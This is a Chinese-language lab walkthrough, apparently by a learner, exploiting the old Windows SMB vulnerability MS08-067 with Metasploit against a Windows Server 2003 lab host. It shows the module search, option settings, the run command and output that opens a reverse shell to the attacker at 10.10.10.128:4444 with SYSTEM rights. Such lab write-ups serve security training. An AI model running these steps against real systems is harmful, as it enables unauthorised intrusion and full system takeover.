# MS08-067 实战训练

## 漏洞简介

MS08-067是2008年爆出的针对Windows系统SMB服务的漏洞，在当时可以对几乎所有Windows版本实施攻击，在2017年爆出的MS17-010威力与其类似，但是可实施的系统版本有局限性，只能对Windows7,WindowsXP,以及部分Windows2008

## 漏洞实战

这个洞真的很老了，但是不妨碍它非常的经典

首先，我们在了解到漏洞编号为MS08-067后，直接在MSF中搜索

```
msf6 > search ms08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi
```

我们选中

```
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > 
```

查看需要定义的参数

```
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.10.128     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
```

配置处和书籍《Metasploit魔鬼训练营》中有一些出入，因为`windows/smb/ms08_067_netapi`这个exp做了更新，Windows 2003 SP0 这个target已经不是第7号了，在2020.5.15已经改成了第3号



在设置好参数后，执行攻击

```
sf6 exploit(windows/smb/ms08_067_netapi) > show options 

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.10.130     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.10.128     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   3   Windows 2003 SP0 Universal


msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.10.128:4444 
[*] 10.10.10.130:445 - Attempting to trigger the vulnerability...
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.10.130
[*] Command shell session 3 opened (10.10.10.128:4444 -> 10.10.10.130:1054) at 2021-05-15 22:23:28 +0800

Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

但是我遇到了一个奇怪的问题，一开始我并不是用的`windows/shell/reverse_tcp`这个Payload，而是`windows/meterpreter/reverse_tcp`,具体原因不详，希望有知道的朋友可以告诉我

